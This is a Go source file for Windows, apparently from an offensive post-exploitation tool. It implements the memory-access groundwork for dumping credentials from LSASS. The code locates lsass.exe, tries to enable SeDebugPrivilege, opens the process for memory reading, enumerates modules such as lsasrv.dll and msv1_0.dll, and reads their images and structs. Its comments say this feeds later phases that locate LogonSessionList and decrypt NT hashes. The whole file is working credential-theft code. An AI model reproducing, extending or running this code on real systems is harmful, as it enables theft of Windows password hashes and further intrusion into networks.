//go:build windows
// +build windows

package commands

// LSASS Remote-Memory Helpers — Phase 2 foundation for hashdump in-situ.
//
// Phase 1 (hashdump_insitu_windows.go) enumerates logon sessions via the LSA
// API in-process. Phase 2 (this file + future Phase 2B/C) walks LSASS memory
// directly to find LogonSessionList globals, MSV1_0 credential entries, and
// the LSA encryption keys needed to decrypt NT hashes.
//
// This file owns three responsibilities:
//
//  1. Locate the lsass.exe process and open it with PROCESS_VM_READ +
//     PROCESS_QUERY_LIMITED_INFORMATION.
//  2. Enumerate the modules loaded in LSASS so callers can resolve a base
//     address for lsasrv.dll, msv1_0.dll, etc.
//  3. ReadProcessMemory wrappers for the byte-buffer and struct-copy use cases.
//
// Pattern scanning + RIP-relative resolution live in sigscan.go (cross-platform
// pure Go, fully unit-tested). Phase 2B will combine `lsassFindModuleInLsass`
// + `lsassReadModuleBytes` + `findPattern` + `resolveRIPRelative` to locate
// the LogonSessionList anchor; Phase 2C will follow the linked list and
// decrypt credentials via BCrypt.

import (
	"fmt"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	procReadProcessMemory = modKernel32.NewProc("ReadProcessMemory")
)

// lsassRemoteModule is the minimal information Phase 2 needs about a module
// loaded in the remote LSASS process: the friendly name (e.g. "lsasrv.dll"),
// the in-process base address, and the mapped image size. Toolhelp32Snapshot
// reports both, so no PROCESS_VM_READ access is required for enumeration.
type lsassRemoteModule struct {
	Name string
	Base uintptr
	Size uint32
}

// lsassFindPID returns the PID of the lsass.exe process. Returns an error if
// it is not running (which on a healthy Windows host should never happen, but
// is the kind of failure that should be reported clearly rather than
// crashing the caller).
func lsassFindPID() (uint32, error) {
	pid, _, err := findProcessByName("lsass.exe")
	if err != nil {
		return 0, fmt.Errorf("locating target process: %w", err)
	}
	return pid, nil
}

// lsassOpenForRead opens the LSASS process with the rights needed to read
// memory and resolve RIP-relative globals (PROCESS_VM_READ +
// PROCESS_QUERY_LIMITED_INFORMATION). Callers must close the returned handle.
//
// Best-effort enables SeDebugPrivilege on the current thread token; failure to
// adjust privileges is non-fatal because OpenProcess may still succeed when
// the caller is already SYSTEM. The returned error covers OpenProcess only.
func lsassOpenForRead(pid uint32) (windows.Handle, error) {
	_ = enableThreadDebugPrivilege() // best-effort
	h, err := windows.OpenProcess(
		windows.PROCESS_VM_READ|windows.PROCESS_QUERY_LIMITED_INFORMATION,
		false,
		pid,
	)
	if err != nil {
		return 0, fmt.Errorf("process open (pid=%d) failed: %w "+
			"(target may be protected, credential guard may be enabled, "+
			"or insufficient privileges)", pid, err)
	}
	return h, nil
}

// lsassEnumModulesInLsass enumerates every module loaded in the LSASS
// process. Uses CreateToolhelp32Snapshot which does not require PROCESS_VM_READ
// — the snapshot service runs in csrss/kernel and reports the loader-list
// view of the target.
func lsassEnumModulesInLsass(pid uint32) ([]lsassRemoteModule, error) {
	snap, err := windows.CreateToolhelp32Snapshot(thSnapModule|thSnapModule32, pid)
	if err != nil {
		return nil, fmt.Errorf("CreateToolhelp32Snapshot(MODULE pid=%d): %w", pid, err)
	}
	defer func() { _ = windows.CloseHandle(snap) }()

	var me moduleEntry32W
	me.Size = uint32(unsafe.Sizeof(me))

	ret, _, callErr := procModule32FirstW.Call(uintptr(snap), uintptr(unsafe.Pointer(&me)))
	if ret == 0 {
		return nil, fmt.Errorf("Module32FirstW: %w", callErr)
	}

	var mods []lsassRemoteModule
	for {
		mods = append(mods, lsassRemoteModule{
			Name: windows.UTF16ToString(me.Module[:]),
			Base: me.ModBaseAddr,
			Size: me.ModBaseSize,
		})
		me.Size = uint32(unsafe.Sizeof(me))
		ret, _, _ = procModule32NextW.Call(uintptr(snap), uintptr(unsafe.Pointer(&me)))
		if ret == 0 {
			break
		}
	}
	return mods, nil
}

// lsassFindModuleInLsass returns the named module's metadata from LSASS.
// Match is case-insensitive ("lsasrv.dll" or "LSASRV.DLL" both work). Returns
// an error wrapping a "module not found" message when the search misses; the
// error string includes the requested name so log output is self-describing.
func lsassFindModuleInLsass(pid uint32, name string) (lsassRemoteModule, error) {
	mods, err := lsassEnumModulesInLsass(pid)
	if err != nil {
		return lsassRemoteModule{}, err
	}
	for _, m := range mods {
		if strings.EqualFold(m.Name, name) {
			return m, nil
		}
	}
	return lsassRemoteModule{}, fmt.Errorf("module %q not loaded in LSASS pid=%d", name, pid)
}

// lsassReadBytes reads `size` bytes from the LSASS process at `addr` and
// returns them as a Go-owned slice. Wraps kernel32!ReadProcessMemory.
//
// A short read (fewer bytes than requested) is reported as an error rather
// than returning a truncated buffer — Phase 2 logic reads fixed-size structs
// and partially-filled buffers would silently produce wrong field values.
func lsassReadBytes(h windows.Handle, addr uintptr, size uint32) ([]byte, error) {
	if size == 0 {
		return nil, nil
	}
	buf := make([]byte, size)
	var read uintptr
	ret, _, callErr := procReadProcessMemory.Call(
		uintptr(h),
		addr,
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(size),
		uintptr(unsafe.Pointer(&read)),
	)
	if ret == 0 {
		return nil, fmt.Errorf("memory read (addr=0x%X size=%d): %w", addr, size, callErr)
	}
	if read != uintptr(size) {
		return nil, fmt.Errorf("memory short read at 0x%X: got %d, want %d", addr, read, size)
	}
	return buf, nil
}

// lsassReadInto fills `dst` with bytes read from `addr` in LSASS. The size
// is taken from the slice length; this avoids a separate copy when the caller
// already has a struct-shaped buffer (e.g. from an unsafe.Slice over a struct
// pointer) and just wants the bytes deposited into it.
func lsassReadInto(h windows.Handle, addr uintptr, dst []byte) error {
	if len(dst) == 0 {
		return nil
	}
	var read uintptr
	ret, _, callErr := procReadProcessMemory.Call(
		uintptr(h),
		addr,
		uintptr(unsafe.Pointer(&dst[0])),
		uintptr(len(dst)),
		uintptr(unsafe.Pointer(&read)),
	)
	if ret == 0 {
		return fmt.Errorf("memory read (addr=0x%X size=%d): %w", addr, len(dst), callErr)
	}
	if int(read) != len(dst) {
		return fmt.Errorf("memory short read at 0x%X: got %d, want %d", addr, read, len(dst))
	}
	return nil
}

// lsassReadModuleBytes reads the entire mapped image of a module out of LSASS
// and returns the buffer. This is the input that Phase 2B feeds to
// findPattern + resolveRIPRelative to locate LogonSessionList. For a typical
// lsasrv.dll the buffer is well under 1 MiB so a single allocation is fine.
func lsassReadModuleBytes(h windows.Handle, mod lsassRemoteModule) ([]byte, error) {
	if mod.Size == 0 {
		return nil, fmt.Errorf("module %q has zero size", mod.Name)
	}
	return lsassReadBytes(h, mod.Base, mod.Size)
}
